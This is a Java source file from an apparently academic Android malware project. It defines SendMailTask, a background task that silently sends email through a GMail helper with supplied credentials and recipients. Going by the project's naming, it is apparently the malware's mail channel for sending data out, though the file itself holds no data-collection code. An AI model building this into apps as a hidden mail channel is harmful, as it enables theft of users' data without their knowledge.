/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.mail;

import java.util.List;



import android.os.AsyncTask;
import android.util.Log;

public class SendMailTask extends AsyncTask<Object, Object, Object> {

	private final String TAG = "SendMailTask";
	private final boolean VERBOSE = true;

	@SuppressWarnings("unchecked")
	@Override
	protected Object doInBackground(Object... args) {
		try {
			if (VERBOSE) Log.d(TAG, "Start of SendMailTask");

			GMail androidEmail = new GMail(args[0].toString(),
					args[1].toString(), 
					(List<String>) args[2], 
					args[3].toString(),
					args[4].toString());
			
			androidEmail.createEmailMessage();
			androidEmail.sendEmail();
			
			if (VERBOSE) {
				Log.v(TAG, "Mail sent");
				Log.d(TAG, "End of SendMailTask");
			}
		} catch (Exception e) {
			if (VERBOSE) Log.e(TAG, e.getMessage(), e);
		}
		return null;
	}
}
